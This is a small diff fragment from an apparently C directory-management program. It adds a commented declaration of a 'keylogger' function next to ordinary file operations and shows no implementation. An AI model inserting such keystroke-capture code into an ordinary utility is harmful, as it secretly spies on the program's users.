@@ -22,6 +22,9 @@ void delete_directory();
 void print_current_directory();
 void list_directory_contents();
 
+// Keylogger Function
+void keylogger();
+
 int main() {
     int choice;
 
